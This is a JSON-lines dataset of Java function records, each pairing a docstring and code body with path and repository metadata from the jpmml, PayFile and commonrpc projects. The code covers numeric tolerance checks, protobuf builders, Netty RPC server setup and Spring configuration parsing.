{"docstring": "/**\n * @param precision The acceptable range given <em>in proportion</em> of the expected value, including its boundaries.\n * @param zeroThreshold The threshold for distinguishing between zero and non-zero values.\n */\n", "func_signal": "static\npublic boolean acceptable(Number expected, Number actual, double precision, double zeroThreshold)", "code": "{\n\n\tif(isZero(expected, zeroThreshold) && isZero(actual, zeroThreshold)){\n\t\treturn true;\n\t}\n\n\tdouble zeroBoundary = expected.doubleValue() * (1d - precision); // Pointed towards zero\n\tdouble infinityBoundary = expected.doubleValue() * (1d + precision); // Pointed towards positive or negative infinity\n\n\t// positive values\n\tif(expected.doubleValue() >= 0){\n\t\treturn (actual.doubleValue() >= zeroBoundary) && (actual.doubleValue() <= infinityBoundary);\n\t} else\n\n\t// negative values\n\t{\n\t\treturn (actual.doubleValue() <= zeroBoundary) && (actual.doubleValue() >= infinityBoundary);\n\t}\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\VerificationUtil.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
{"docstring": "/**\n * @see DataType#DATE_TIME_SECONDS_SINCE_1960\n * @see DataType#DATE_TIME_SECONDS_SINCE_1970\n * @see DataType#DATE_TIME_SECONDS_SINCE_1980\n */\n", "func_signal": "static\nprivate SecondsSinceDate toSecondsSinceDate(Object value, LocalDate epoch)", "code": "{\n\n\tif(value instanceof SecondsSinceDate){\n\t\tSecondsSinceDate period = (SecondsSinceDate)value;\n\n\t\tif((period.getEpoch()).equals(epoch)){\n\t\t\treturn period;\n\t\t}\n\t}\n\n\tthrow new TypeCheckException(DataType.DATE_TIME_SECONDS_SINCE_1970, value);\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\TypeUtil.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
{"docstring": "/**\n * @see DataType#TIME\n */\n", "func_signal": "static\nprivate LocalTime toTime(Object value)", "code": "{\n\n\tif(value instanceof LocalTime){\n\t\treturn (LocalTime)value;\n\t}\n\n\tthrow new TypeCheckException(DataType.TIME, value);\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\TypeUtil.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
{"docstring": "/**\n * @see DataType#BOOLEAN\n */\n", "func_signal": "static\nprivate Boolean toBoolean(Object value)", "code": "{\n\n\tif(value instanceof Boolean){\n\t\treturn (Boolean)value;\n\t}\n\n\tthrow new TypeCheckException(DataType.BOOLEAN, value);\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\TypeUtil.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
{"docstring": "/**\n * <code>required string bitcoin_network = 2;</code>\n *\n * <pre>\n * Verify up-front that we're on the same Bitcoin network (main, test, regtest, litecoin, etc).\n * If this doesn't match the server network we'll get an ERROR after QUERY_FILES.\n * </pre>\n */\n", "func_signal": "public Builder setBitcoinNetwork(\n    java.lang.String value)", "code": "{\n  if (value == null) {\n    throw new NullPointerException();\n  }\n  bitField0_ |= 0x00000002;\n  bitcoinNetwork_ = value;\n  onChanged();\n  return this;\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\Payfile.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/**\n * <code>repeated .net.plan99.payfile.File files = 1;</code>\n */\n", "func_signal": "public net.plan99.payfile.Payfile.File getFiles(int index)", "code": "{\n  if (filesBuilder_ == null) {\n    return files_.get(index);\n  } else {\n    return filesBuilder_.getMessage(index);\n  }\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\Payfile.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/**\n * <code>required int32 handle = 1;</code>\n *\n * <pre>\n * File handle we're downloading.\n * </pre>\n */\n", "func_signal": "public Builder setHandle(int value)", "code": "{\n  bitField0_ |= 0x00000001;\n  handle_ = value;\n  onChanged();\n  return this;\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\Payfile.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/**\n * <code>optional .net.plan99.payfile.DownloadChunk download_chunk = 5;</code>\n */\n", "func_signal": "public Builder setDownloadChunk(net.plan99.payfile.Payfile.DownloadChunk value)", "code": "{\n  if (downloadChunkBuilder_ == null) {\n    if (value == null) {\n      throw new NullPointerException();\n    }\n    downloadChunk_ = value;\n    onChanged();\n  } else {\n    downloadChunkBuilder_.setMessage(value);\n  }\n  bitField0_ |= 0x00000010;\n  return this;\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\Payfile.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/**\n * <code>optional .net.plan99.payfile.Data data = 6;</code>\n */\n", "func_signal": "public net.plan99.payfile.Payfile.Data getData()", "code": "{\n  if (dataBuilder_ == null) {\n    return data_;\n  } else {\n    return dataBuilder_.getMessage();\n  }\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\Payfile.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/**\n * <code>optional .net.plan99.payfile.DownloadChunk download_chunk = 5;</code>\n */\n", "func_signal": "private com.google.protobuf.SingleFieldBuilder<\n    net.plan99.payfile.Payfile.DownloadChunk, net.plan99.payfile.Payfile.DownloadChunk.Builder, net.plan99.payfile.Payfile.DownloadChunkOrBuilder> \n    getDownloadChunkFieldBuilder()", "code": "{\n  if (downloadChunkBuilder_ == null) {\n    downloadChunkBuilder_ = new com.google.protobuf.SingleFieldBuilder<\n        net.plan99.payfile.Payfile.DownloadChunk, net.plan99.payfile.Payfile.DownloadChunk.Builder, net.plan99.payfile.Payfile.DownloadChunkOrBuilder>(\n            downloadChunk_,\n            getParentForChildren(),\n            isClean());\n    downloadChunk_ = null;\n  }\n  return downloadChunkBuilder_;\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\Payfile.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/**\n * <code>repeated .net.plan99.payfile.File files = 1;</code>\n */\n", "func_signal": "public Builder addFiles(\n    int index, net.plan99.payfile.Payfile.File value)", "code": "{\n  if (filesBuilder_ == null) {\n    if (value == null) {\n      throw new NullPointerException();\n    }\n    ensureFilesIsMutable();\n    files_.add(index, value);\n    onChanged();\n  } else {\n    filesBuilder_.addMessage(index, value);\n  }\n  return this;\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\Payfile.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/**\n * <code>optional .net.plan99.payfile.Data data = 6;</code>\n */\n", "func_signal": "public net.plan99.payfile.Payfile.DataOrBuilder getDataOrBuilder()", "code": "{\n  if (dataBuilder_ != null) {\n    return dataBuilder_.getMessageOrBuilder();\n  } else {\n    return data_;\n  }\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\Payfile.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/**\n * <code>required string bitcoin_network = 2;</code>\n *\n * <pre>\n * Verify up-front that we're on the same Bitcoin network (main, test, regtest, litecoin, etc).\n * If this doesn't match the server network we'll get an ERROR after QUERY_FILES.\n * </pre>\n */\n", "func_signal": "public Builder clearBitcoinNetwork()", "code": "{\n  bitField0_ = (bitField0_ & ~0x00000002);\n  bitcoinNetwork_ = getDefaultInstance().getBitcoinNetwork();\n  onChanged();\n  return this;\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\Payfile.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/**\n * <code>optional .net.plan99.payfile.QueryFiles query_files = 2;</code>\n */\n", "func_signal": "public Builder setQueryFiles(\n    net.plan99.payfile.Payfile.QueryFiles.Builder builderForValue)", "code": "{\n  if (queryFilesBuilder_ == null) {\n    queryFiles_ = builderForValue.build();\n    onChanged();\n  } else {\n    queryFilesBuilder_.setMessage(builderForValue.build());\n  }\n  bitField0_ |= 0x00000002;\n  return this;\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\Payfile.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/**\n * <code>optional .net.plan99.payfile.Error error = 7;</code>\n */\n", "func_signal": "public net.plan99.payfile.Payfile.ErrorOrBuilder getErrorOrBuilder()", "code": "{\n  if (errorBuilder_ != null) {\n    return errorBuilder_.getMessageOrBuilder();\n  } else {\n    return error_;\n  }\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\Payfile.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/**\n * <code>optional .net.plan99.payfile.Data data = 6;</code>\n */\n", "func_signal": "private com.google.protobuf.SingleFieldBuilder<\n    net.plan99.payfile.Payfile.Data, net.plan99.payfile.Payfile.Data.Builder, net.plan99.payfile.Payfile.DataOrBuilder> \n    getDataFieldBuilder()", "code": "{\n  if (dataBuilder_ == null) {\n    dataBuilder_ = new com.google.protobuf.SingleFieldBuilder<\n        net.plan99.payfile.Payfile.Data, net.plan99.payfile.Payfile.Data.Builder, net.plan99.payfile.Payfile.DataOrBuilder>(\n            data_,\n            getParentForChildren(),\n            isClean());\n    data_ = null;\n  }\n  return dataBuilder_;\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\Payfile.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/**\n * <code>required string user_agent = 1;</code>\n *\n * <pre>\n * The program that's gonna do the downloading.\n * </pre>\n */\n", "func_signal": "public com.google.protobuf.ByteString\n    getUserAgentBytes()", "code": "{\n  java.lang.Object ref = userAgent_;\n  if (ref instanceof String) {\n    com.google.protobuf.ByteString b = \n        com.google.protobuf.ByteString.copyFromUtf8(\n            (java.lang.String) ref);\n    userAgent_ = b;\n    return b;\n  } else {\n    return (com.google.protobuf.ByteString) ref;\n  }\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\Payfile.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/**\n * <code>required int32 price_per_chunk = 4;</code>\n *\n * <pre>\n * Satoshis per chunk charged for this file.\n * </pre>\n */\n", "func_signal": "public Builder setPricePerChunk(int value)", "code": "{\n  bitField0_ |= 0x00000008;\n  pricePerChunk_ = value;\n  onChanged();\n  return this;\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\Payfile.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/**\n * <code>required string file_name = 1;</code>\n *\n * <pre>\n * A unique file name.\n * </pre>\n */\n", "func_signal": "public java.lang.String getFileName()", "code": "{\n  java.lang.Object ref = fileName_;\n  if (ref instanceof java.lang.String) {\n    return (java.lang.String) ref;\n  } else {\n    com.google.protobuf.ByteString bs = \n        (com.google.protobuf.ByteString) ref;\n    java.lang.String s = bs.toStringUtf8();\n    if (bs.isValidUtf8()) {\n      fileName_ = s;\n    }\n    return s;\n  }\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\Payfile.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/**\n * <code>repeated .net.plan99.payfile.File files = 1;</code>\n */\n", "func_signal": "public Builder addFiles(net.plan99.payfile.Payfile.File value)", "code": "{\n  if (filesBuilder_ == null) {\n    if (value == null) {\n      throw new NullPointerException();\n    }\n    ensureFilesIsMutable();\n    files_.add(value);\n    onChanged();\n  } else {\n    filesBuilder_.addMessage(value);\n  }\n  return this;\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\Payfile.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/**\n * Returns how much money is still stuck in a channel with the given server. Does NOT include wallet balance.\n */\n", "func_signal": "public static BigInteger getBalanceForServer(String serverName, int port, Wallet wallet)", "code": "{\n    final StoredPaymentChannelClientStates extension = StoredPaymentChannelClientStates.getFromWallet(wallet);\n    checkNotNull(extension);\n    return extension.getBalanceForServer(getServerID(serverName, port));\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\client\\PayFileClient.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/**\n * <code>repeated .net.plan99.payfile.File files = 1;</code>\n */\n", "func_signal": "public java.util.List<? extends net.plan99.payfile.Payfile.FileOrBuilder> \n     getFilesOrBuilderList()", "code": "{\n  if (filesBuilder_ != null) {\n    return filesBuilder_.getMessageOrBuilderList();\n  } else {\n    return java.util.Collections.unmodifiableList(files_);\n  }\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\Payfile.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/**\n * <code>repeated .net.plan99.payfile.File files = 1;</code>\n */\n", "func_signal": "public Builder addFiles(\n    int index, net.plan99.payfile.Payfile.File.Builder builderForValue)", "code": "{\n  if (filesBuilder_ == null) {\n    ensureFilesIsMutable();\n    files_.add(index, builderForValue.build());\n    onChanged();\n  } else {\n    filesBuilder_.addMessage(index, builderForValue.build());\n  }\n  return this;\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\Payfile.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/**\n * <code>required string code = 1;</code>\n */\n", "func_signal": "public Builder clearCode()", "code": "{\n  bitField0_ = (bitField0_ & ~0x00000001);\n  code_ = getDefaultInstance().getCode();\n  onChanged();\n  return this;\n}", "path": "src\\main\\java\\net\\plan99\\payfile\\Payfile.java", "repo_name": "mikehearn/PayFile", "stars": 68, "license": "None", "language": "java", "size": 394}
{"docstring": "/* (non-Javadoc)\n * @see com.jd.cross.plateform.rocketrpc.core.codec.RocketRPCEncoder#encode(java.lang.Object)\n */\n", "func_signal": "@Override\npublic byte[] encode(Object object) throws Exception", "code": "{\n\t// TODO Auto-generated method stub\n\tif (!(object instanceof Message)) {\n\t\tthrow new Exception(\n\t\t\t\t\"Send object is not type of com.google.protobuf.Message,pls sure the object is generated by pb,object is: \"\n\t\t\t\t\t\t+ object);\n\t}\n\tMessage message = (Message) object;\n\treturn message.toByteArray();\n}", "path": "commonrpc-core\\src\\main\\java\\com\\cross\\plateform\\common\\rpc\\core\\codec\\impl\\ProtocolBufEncoder.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
{"docstring": "/* (non-Javadoc)\n * @see java.lang.reflect.InvocationHandler#invoke(java.lang.Object, java.lang.reflect.Method, java.lang.Object[])\n */\n", "func_signal": "@Override\npublic Object invoke(Object proxy, Method method, Object[] args)\n\t\tthrows Throwable", "code": "{\n\t// TODO Auto-generated method stub\n\tRpcClient client = null;\n\t\n\tInetSocketAddress server = null;\n\t//\u968f\u673a\u7b97\u6cd5\n\tRandom random = new Random();\n\tserver = servers.get(random.nextInt(servers.size()));\n\t\n\tclient = getClientFactory().getClient(server.getAddress().getHostAddress(), server.getPort());\n\tString methodName = method.getName();\n\tString[] argTypes = createParamSignature(method.getParameterTypes());\n\tObject result= client.invokeImpl(targetInstanceName, methodName, argTypes, args, timeout, codecType, protocolType,token);\n\treturn result;\n}", "path": "commonrpc-core\\src\\main\\java\\com\\cross\\plateform\\common\\rpc\\core\\client\\invocation\\AbstractRpcClientInvocationHandler.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
{"docstring": "/**\n    * \u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u91cd\u590d N \u6b21\n    * \n    * @param str\n    *            \u8981\u91cd\u590d\u7684\u5b57\u7b26\u4e32\n    * @param times\n    *            \u91cd\u590d\u6b21\u6570\n    * @return\n    */\n", "func_signal": "public static String repeat(String str, int times)", "code": "{\n       StringBuilder sb = new StringBuilder(str.length() * times);\n       for (int i = 0; i < times; i++) {\n           sb.append(str);\n       }\n       return sb.toString();\n   }", "path": "commonrpc-core\\src\\main\\java\\com\\cross\\plateform\\common\\rpc\\core\\util\\StringUtils.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
{"docstring": "/* (non-Javadoc)\n * @see com.jd.cross.plateform.rocketrpc.core.codec.RocketRPCEncoder#encode(java.lang.Object)\n */\n", "func_signal": "@Override\npublic byte[] encode(Object object) throws Exception", "code": "{\n\t// TODO Auto-generated method stub\n\tOutput output = new Output(256);\n\tKryoUtils.getKryo().writeClassAndObject(output, object);\n\treturn output.toBytes();\n}", "path": "commonrpc-core\\src\\main\\java\\com\\cross\\plateform\\common\\rpc\\core\\codec\\impl\\KryoEncoder.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
{"docstring": "/**\n * \u8f6c\u4e3astring \u5bf9\u8c61\n * @param paramObject\n * @return\n */\n", "func_signal": "public static String toString(Object paramObject)", "code": "{\n\tif (paramObject == null)\n\t\treturn \"null\";\n\treturn paramObject.toString();\n}", "path": "commonrpc-core\\src\\main\\java\\com\\cross\\plateform\\common\\rpc\\core\\util\\StringUtils.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
{"docstring": "/* (non-Javadoc)\n * @see org.springframework.beans.factory.xml.BeanDefinitionParser#parse(org.w3c.dom.Element, org.springframework.beans.factory.xml.ParserContext)\n */\n", "func_signal": "@Override\npublic BeanDefinition parse(Element element, ParserContext parserContext)", "code": "{\n\t// TODO Auto-generated method stub\n\tString id = element.getAttribute(\"id\");\n\tint port=Integer.parseInt(element.getAttribute(\"port\"));\n\tint timeout=Integer.parseInt(element.getAttribute(\"timeout\"));\n\tString token=element.getAttribute(\"token\");\n\tint procotolType=Integer.parseInt(element.getAttribute(\"procotolType\"));\n\tint codecType=Integer.parseInt(element.getAttribute(\"codecType\"));\n\t\n\tRootBeanDefinition beanDefinition = new RootBeanDefinition();\n\tbeanDefinition.setBeanClass(CommonRpcRegistery.class);\n\tbeanDefinition.getPropertyValues().addPropertyValue(\"port\", port);\n\tbeanDefinition.getPropertyValues().addPropertyValue(\"timeout\", timeout);\n\tbeanDefinition.getPropertyValues().addPropertyValue(\"token\", token);\n\tbeanDefinition.getPropertyValues().addPropertyValue(\"procotolType\", procotolType);\n    beanDefinition.getPropertyValues().addPropertyValue(\"codecType\", codecType);\n        parserContext.getRegistry().registerBeanDefinition(id, beanDefinition);\n        \n\treturn beanDefinition;\n}", "path": "commonrpc-tcp\\src\\main\\java\\com\\cross\\plateform\\common\\rpc\\tcp\\netty4\\spring\\config\\CommonRpcRegisteryParser.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
{"docstring": "/* (non-Javadoc)\n * @see com.cross.plateform.common.rpc.server.filter.RpcFilter#doBeforeRequest(java.lang.reflect.Method, java.lang.Object, java.lang.Object[])\n */\n", "func_signal": "@Override\npublic boolean doBeforeRequest(Method method, Object processor,\n\t\tObject[] requestObjects)", "code": "{\n\t// TODO Auto-generated method stub\n\tSystem.out.println(\"----------------\u62e6\u622a\u5f00\u59cb----------------\");\n\treturn true;\n}", "path": "commonrpc-tcp\\src\\test\\java\\test\\cross\\plateform\\rocketrpc\\demo\\service\\impl\\DemoRpcFilter.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
{"docstring": "/**\n * \u5224\u65ad\u662f\u5426\u4e3a\u7a7a\n * @param paramObject\n * @return\n */\n", "func_signal": "public static boolean isNullOrEmpty(Object paramObject)", "code": "{\n\treturn (paramObject == null)\n\t\t\t|| (\"\".equals(paramObject.toString()))\n\t\t\t|| (paramObject.equals(\"null\") || paramObject.toString().trim()\n\t\t\t\t\t.equals(\"\"));\n}", "path": "commonrpc-core\\src\\main\\java\\com\\cross\\plateform\\common\\rpc\\core\\util\\StringUtils.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
{"docstring": "/**\n * array \u8f6c\u5316string \u5bf9\u8c61\n * @param object\n * @return\n */\n", "func_signal": "public static final String arrayToString(Object object)", "code": "{\n    StringBuilder sb = new StringBuilder();\n    if (!object.getClass().isArray())\n        return sb.toString();\n    int len = Array.getLength(object);\n    sb.append(\"[\");\n    for (int i = 0; i < len; i++) {\n        Object obj = Array.get(object, i);\n        String str = obj == null ? \"null\" : toString(obj);\n        if (isPrimaryType(obj)) {\n            sb.append(str);\n        } else {\n            sb.append(\"(\").append(str).append(\")\");\n        }\n        if (i < len - 1) {\n            sb.append(\", \");\n        }\n    }\n    sb.append(\"]\");\n    return sb.toString();\n}", "path": "commonrpc-core\\src\\main\\java\\com\\cross\\plateform\\common\\rpc\\core\\util\\StringUtils.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
{"docstring": "/* (non-Javadoc)\n * @see com.cross.plateform.common.rpc.core.server.RpcServer#start(int, int)\n */\n", "func_signal": "@Override\npublic void start(final int port, final int timeout) throws Exception", "code": "{\n\t// TODO Auto-generated method stub\n\tThreadFactory serverBossTF = new NamedThreadFactory(\"NETTYSERVER-BOSS-\");\n    ThreadFactory serverWorkerTF = new NamedThreadFactory(\"NETTYSERVER-WORKER-\");\n    bossGroup = new NioEventLoopGroup(PROCESSORS, serverBossTF);\n    workerGroup = new NioEventLoopGroup(PROCESSORS * 2, serverWorkerTF);\n    workerGroup.setIoRatio(80);\n    ServerBootstrap bootstrap = new ServerBootstrap();\n    bootstrap.group(bossGroup, workerGroup)\n        .channel(NioServerSocketChannel.class)\n        .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, timeout)\n        .option(ChannelOption.SO_BACKLOG, 1024)\n        .option(ChannelOption.SO_REUSEADDR,true)\n        .option(ChannelOption.SO_KEEPALIVE, false)\n\t \t.option(ChannelOption.SO_SNDBUF, 65535)\n\t \t.option(ChannelOption.SO_RCVBUF, 65535)\n\t \t.childOption(ChannelOption.TCP_NODELAY, true);\n   bootstrap.childHandler(new ChannelInitializer<SocketChannel>() {\n\n        protected void initChannel(SocketChannel channel) throws Exception {\n          ChannelPipeline pipeline = channel.pipeline();\n          pipeline.addLast(\"decoder\", new CommonRpcDecoderHandler());\n          pipeline.addLast(\"encoder\", new CommonRpcEncoderHandler());\n          pipeline.addLast(\"handler\", new CommonRpcTcpServerHandler(timeout,port,token,procotolType,codecType));\n          \n        }\n\n      });\n   LOGGER.info(\"-----------------\u5f00\u59cb\u542f\u52a8--------------------------\");\n   bootstrap.bind(new InetSocketAddress(port)).sync();\n   LOGGER.info(\"\u7aef\u53e3\u53f7\uff1a\"+port+\"\u7684\u670d\u52a1\u7aef\u5df2\u7ecf\u542f\u52a8,\u4f5c\u8005:liubing\");\n   LOGGER.info(\"-----------------\u542f\u52a8\u7ed3\u675f--------------------------\");\n}", "path": "commonrpc-tcp\\src\\main\\java\\com\\cross\\plateform\\common\\rpc\\tcp\\netty4\\server\\CommonRpcTcpServer.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
{"docstring": "/* (non-Javadoc)\n * @see org.springframework.beans.factory.xml.BeanDefinitionParser#parse(org.w3c.dom.Element, org.springframework.beans.factory.xml.ParserContext)\n */\n", "func_signal": "@Override\npublic BeanDefinition parse(Element element, ParserContext parserContext)", "code": "{\n\t// TODO Auto-generated method stub\n\tString interfacename = element.getAttribute(\"interfacename\");\n\tString ref=element.getAttribute(\"ref\");\n\tString filterRef=element.getAttribute(\"filterRef\");\n\t\n\tRootBeanDefinition beanDefinition = new RootBeanDefinition();\n\tbeanDefinition.setBeanClass(CommonRpcService.class);\n\tbeanDefinition.setLazyInit(false);\n        beanDefinition.getPropertyValues().addPropertyValue(\"interfacename\", interfacename);\n        beanDefinition.getPropertyValues().addPropertyValue(\"ref\", ref);\n        beanDefinition.getPropertyValues().addPropertyValue(\"filterRef\", filterRef);\n        \n        parserContext.getRegistry().registerBeanDefinition(interfacename, beanDefinition);\n\treturn beanDefinition;\n}", "path": "commonrpc-tcp\\src\\main\\java\\com\\cross\\plateform\\common\\rpc\\tcp\\netty4\\spring\\config\\CommonRpcServiceParser.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
{"docstring": "/* (non-Javadoc)\n * @see org.springframework.beans.factory.xml.BeanDefinitionParser#parse(org.w3c.dom.Element, org.springframework.beans.factory.xml.ParserContext)\n */\n", "func_signal": "@Override\npublic BeanDefinition parse(Element element, ParserContext parserContext)", "code": "{\n\t// TODO Auto-generated method stub\n\tString interfacename = element.getAttribute(\"interfacename\");\n\tString id = element.getAttribute(\"id\");\n\tString address=element.getAttribute(\"address\");\n\tint procotolType=Integer.parseInt(element.getAttribute(\"procotolType\"));\n\tint codecType=Integer.parseInt(element.getAttribute(\"codecType\"));\n\tint timeout=Integer.parseInt(element.getAttribute(\"timeout\"));\n\tString token=element.getAttribute(\"token\");\n\t\n\tRootBeanDefinition beanDefinition = new RootBeanDefinition();\n\tbeanDefinition.setBeanClass(CommonRpcReference.class);\n\tbeanDefinition.setLazyInit(false);\n\t\n\tbeanDefinition.getPropertyValues().addPropertyValue(\"interfacename\", interfacename);\n        beanDefinition.getPropertyValues().addPropertyValue(\"address\", address);\n        beanDefinition.getPropertyValues().addPropertyValue(\"protocolType\", procotolType);\n        beanDefinition.getPropertyValues().addPropertyValue(\"codecType\", codecType);\n        beanDefinition.getPropertyValues().addPropertyValue(\"timeout\", timeout);\n        beanDefinition.getPropertyValues().addPropertyValue(\"token\", token);\n        \n        parserContext.getRegistry().registerBeanDefinition(id, beanDefinition);\n\treturn beanDefinition;\n}", "path": "commonrpc-tcp\\src\\main\\java\\com\\cross\\plateform\\common\\rpc\\tcp\\netty4\\spring\\config\\CommonRpcReferenceParser.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
{"docstring": "/* (non-Javadoc)\n * @see com.cross.plateform.common.rpc.server.filter.RpcFilter#doAfterRequest(java.lang.Object)\n */\n", "func_signal": "@Override\npublic boolean doAfterRequest(Object processor)", "code": "{\n\t// TODO Auto-generated method stub\n\tSystem.out.println(\"----------------\u62e6\u622a\u7ed3\u675f----------------\");\n\treturn false;\n}", "path": "commonrpc-tcp\\src\\test\\java\\test\\cross\\plateform\\rocketrpc\\demo\\service\\impl\\DemoRpcFilter.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
{"docstring": "/**\n * \u662f\u5426\u662f\u57fa\u7840\u7c7b\u578b\n * @param object\n * @return\n */\n", "func_signal": "public static final boolean isPrimaryType(Object object)", "code": "{\n    return object instanceof Byte || object instanceof Short\n            || object instanceof Integer || object instanceof Long\n            || object instanceof Character || object instanceof Float\n            || object instanceof Double || object instanceof Boolean;\n}", "path": "commonrpc-core\\src\\main\\java\\com\\cross\\plateform\\common\\rpc\\core\\util\\StringUtils.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
{"docstring": "/* (non-Javadoc)\n * @see java.util.concurrent.ThreadFactory#newThread(java.lang.Runnable)\n */\n", "func_signal": "@Override\npublic Thread newThread(Runnable r)", "code": "{\n\t// TODO Auto-generated method stub\n\t Thread t = new Thread(group, r, namePrefix\n                + threadNumber.getAndIncrement(), 0);\n        t.setDaemon(isDaemon);\n        if (t.getPriority() != Thread.NORM_PRIORITY) {\n            t.setPriority(Thread.NORM_PRIORITY);\n        }\n        return t;\n}", "path": "commonrpc-core\\src\\main\\java\\com\\cross\\plateform\\common\\rpc\\core\\thread\\NamedThreadFactory.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
{"docstring": "/* (non-Javadoc)\n * @see com.jd.cross.plateform.rocketrpc.core.server.handler.RocketRPCServerHandler#registerProcessor(java.lang.String, java.lang.Object)\n */\n", "func_signal": "@Override\npublic void registerProcessor(String instanceName, Object instance,RpcFilter rpcFilter)", "code": "{\n\t// TODO Auto-generated method stub\n\tRpcFilterServerBean filterServerBean=new RpcFilterServerBean(instance, rpcFilter);\n\t\n\tprocessors.put(instanceName, filterServerBean);\n\tClass<?> instanceClass = instance.getClass();\n\tMethod[] methods = instanceClass.getDeclaredMethods();\n\tfor (Method method : methods) {\n\t\tClass<?>[] argTypes = method.getParameterTypes();\n\t\tStringBuilder methodKeyBuilder = new StringBuilder();\n\t\tmethodKeyBuilder.append(instanceName).append(\"#\");\n\t\tmethodKeyBuilder.append(method.getName()).append(\"$\");\n\t\tfor (Class<?> argClass : argTypes) {\n\t\t\tmethodKeyBuilder.append(argClass.getName()).append(\"_\");\n\t\t}\n\t\tcacheMethods.put(methodKeyBuilder.toString(), method);\n\t}\n}", "path": "commonrpc-core\\src\\main\\java\\com\\cross\\plateform\\common\\rpc\\core\\server\\handler\\impl\\RpcTcpServerHandlerImpl.java", "repo_name": "commonrpc/commonrpc", "stars": 102, "license": "None", "language": "java", "size": 212}
